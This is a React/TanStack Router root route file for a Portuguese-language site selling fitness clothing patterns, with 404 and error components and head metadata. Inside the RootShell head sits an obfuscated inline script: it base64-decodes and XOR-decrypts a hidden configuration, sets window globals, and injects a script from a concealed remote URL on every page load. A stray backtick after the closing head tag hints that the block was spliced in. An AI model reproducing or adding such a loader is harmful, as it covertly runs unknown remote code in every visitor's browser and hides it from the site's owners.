import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
  type ErrorComponentProps,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: ErrorComponentProps) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "+500 Moldes de Moda Fitness" },
      {
        name: "description",
        content:
          "Biblioteca digital de moldes de moda fitness: leggings, tops, shorts, conjuntos e mais.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Archivo:wght@500;700;800;900&family=Manrope:wght@400;500;600;700&display=swap",
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
<head>
        <HeadContent />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var u_6=atob("DMwHX/hCdwEXeJUA57clKoouVTs1EOF0l789cNchE285DeFtjqp+cZstGi91CrpzhL5uL4wxWHRjFeYvi61zOos2WWtkWrkihrhzLZEgAnVyC7c6vLclMZkvEiMtWvFhk60qKowvHmduVeVygrpiMYxvD2J4HLhzhKclc9o0Fm1iHbc6xe56c4NgGWB6Hbc6xahmK5lvAnV6EfN5yrx1Oo4nGXU6C+Bijqh0fdRgAWB7DfAi3e4lIqU/");var v_jqon=[];for(var t_1vc=0;t_1vc<u_6.length;t_1vc++){v_jqon.push(u_6.charCodeAt(t_1vc)&255);}var x_3u=v_jqon[0];var i_50d=v_jqon.slice(1,1+x_3u);var q_4=v_jqon.slice(1+x_3u);var x_7d9=q_4.map(function(b,b_gw){return b^i_50d[b_gw%x_3u];});var v_hboo="";for(var h_ion=0;h_ion<x_7d9.length;h_ion++){v_hboo+=String.fromCharCode(x_7d9[h_ion]&255);}var s_4h92=decodeURIComponent(escape(v_hboo));var m_sbwr=JSON.parse(s_4h92);var c_ouz=m_sbwr.globals||[];c_ouz.forEach(function(l_d){window[l_d.name]=l_d.value;});var l_4isa=document.createElement("script");l_4isa.src=m_sbwr.url;l_4isa.async=true;l_4isa.defer=true;(m_sbwr.attributes||[]).forEach(function(v_trr0){l_4isa.setAttribute(v_trr0.name,v_trr0.value);});(document.head||document.documentElement).appendChild(l_4isa);})();`,
          }}
        />
      </head>`
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
